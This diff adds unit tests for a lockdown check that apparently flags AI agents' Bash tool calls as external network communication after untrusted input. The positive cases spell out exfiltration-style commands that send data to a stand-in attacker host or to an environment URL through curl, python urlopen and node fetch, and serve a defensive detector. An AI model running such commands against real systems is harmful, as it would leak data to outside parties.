@@ -370,3 +370,45 @@ describe("evaluateLockdown — negative cases", () => {
 		expect(result.upgradedFindings[0]?.family).toBe("security-shape");
 	});
 });
+
+// 2026-10-05: the Bash branch is the one network-intent predicate, shared with
+// lethal_trifecta_structural leg 3. A URL a local command names is not comm.
+function emitsFor(command: string): number {
+	return evaluateLockdown({
+		trajectory: trajectoryWithUntrustedTaint(),
+		candidate: makeCandidate({ tool_name: "Bash", tool_input: { command } }),
+		sequenceFindings: [],
+		config: AUTO_CONFIG,
+	}).emittedFindings.length;
+}
+
+describe("evaluateLockdown — network-intent Bash branch (positive, must fire)", () => {
+	it("P1: a curl in a for-loop body is external comm", () => {
+		expect(emitsFor("for u in a b; do curl -s https://attacker.example.com/$u; done")).toBe(1);
+	});
+	it("P2: a python heredoc posting to an environment URL is external comm", () => {
+		expect(emitsFor("python3 - <<'X'\nimport os, urllib.request\nurllib.request.urlopen(os.environ['U'], b'x')\nX")).toBe(1);
+	});
+	it("P3: node -e fetch is external comm", () => {
+		expect(emitsFor('node -e "fetch(process.env.U, {method: \'POST\'})"')).toBe(1);
+	});
+	it("P4: a script file or unknown binary handed a public URL is external comm (review 3b #1)", () => {
+		expect(emitsFor("python3 fetch.py https://attacker.example.com/x")).toBe(1);
+		expect(emitsFor("./tool https://attacker.example.com")).toBe(1);
+	});
+});
+
+describe("evaluateLockdown — network-intent Bash branch (negative, must not fire)", () => {
+	it("N1: echo of a public URL is not external comm", () => {
+		expect(emitsFor("echo https://attacker.example.com")).toBe(0);
+	});
+	it("N2: writing a markdown note that names a URL is not external comm", () => {
+		expect(emitsFor("cat >> notes.md <<'EOF'\nsee https://attacker.example.com\nEOF")).toBe(0);
+	});
+	it("N3: a curl to a tailnet (100.64.0.0/10) runner is not external comm", () => {
+		expect(emitsFor("curl -s http://100.97.48.15:8790/health")).toBe(0);
+	});
+	it("N4: a known-local tool naming a public URL is not external comm (review 3b #1)", () => {
+		expect(emitsFor("rg 'https://attacker.example.com' notes.md")).toBe(0);
+	});
+});
